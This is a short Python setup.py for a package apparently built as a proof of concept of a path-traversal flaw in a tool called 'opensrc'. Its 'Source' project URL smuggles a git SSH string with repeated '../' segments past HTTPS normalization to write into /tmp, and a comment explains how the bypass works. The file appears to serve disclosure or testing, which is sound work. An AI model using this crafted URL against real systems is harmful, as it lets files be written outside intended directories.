from setuptools import setup

setup(
    name='opensrc-poc-traversal',
    version='1.0.2',
    description='PoC for path traversal',
    project_urls={
        # The embedded SSH string bypasses HTTPS normalization but triggers the unanchored regex in opensrc
        'Source': 'https://github.com/ignored?git@github.com:<USERNAME>/../../../../../../tmp/opensrc-pwned'
    }
)